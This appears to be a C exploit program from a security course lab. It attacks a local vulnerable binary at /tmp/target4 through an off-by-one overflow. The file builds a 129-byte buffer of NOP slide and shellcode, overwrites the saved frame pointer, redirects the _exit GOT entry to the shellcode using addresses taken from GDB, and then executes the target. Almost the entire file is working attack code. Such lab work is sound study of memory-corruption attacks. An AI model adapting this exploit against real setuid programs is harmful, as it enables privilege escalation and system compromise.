#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target4"
#define DEFAULT_FILE "/tmp/xploit4_output"

// Get the address by using GDB
// 0x555555555030 <_exit@plt> jmp *0x2fe2(%rip) # 0x555555558018 <_exit@got.plt>
#define EXIT_ADDR 0x555555558010
#define ARG_EXPLOIT_ADDR 0x7ffffffeed40

int main(void)
{
  // Determine size of exploit
  // As we have "int i = 0; i <= len; i++" in the target4.c,
  // so we can add 1 more byte to overwrite the saved RBP.
  char exploit[129];

  // Fill exploit buffer with NOP slide
  // As we have NOP slide, we can just put the shellcode
  // inside the exploit string. Then set the last byte of
  // exploit string to another value to ruin the rbp.
  // In this case, we change the rbp from 0x7ffffffeed20 to 0x7ffffffeed68
  memset(exploit, '\x90', sizeof(exploit));
  memcpy(exploit + 1, shellcode, sizeof(shellcode) - 1);
  *(size_t *)(exploit + 128) = 0x68;

  // We need to take advantage of *p = a to change the EXIT jump address
  // 0x7ffffffeed40 + 24 = 0x7ffffffeed58, the new address of a
  // 0x7ffffffeed40 + 32 = 0x7ffffffeed60, the new address of p
  // We basically make exit() jump to our exploit shell code.
  *(size_t *)(exploit + 24) = ARG_EXPLOIT_ADDR;
  *(size_t *)(exploit + 32) = EXIT_ADDR;

  write_xploit(exploit, sizeof(exploit), DEFAULT_FILE);

  char *args[] = { TARGET, DEFAULT_FILE, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  perror("execve failed");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}
